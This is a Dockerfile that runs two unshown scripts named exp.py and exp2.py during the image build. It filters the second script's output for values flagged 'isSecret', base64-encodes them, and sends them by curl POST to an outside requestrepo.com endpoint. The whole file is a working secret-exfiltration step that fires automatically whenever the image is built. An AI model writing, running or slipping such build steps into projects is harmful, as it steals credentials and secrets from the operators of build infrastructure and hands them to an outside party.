FROM python:3.13

WORKDIR /app

COPY exp.py .
COPY exp2.py .

RUN python3 exp.py | base64 -w 0

RUN RESULT=$(python3 exp2.py | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0) && curl -X POST https://mev3e0aj.requestrepo.com -d "$RESULT"
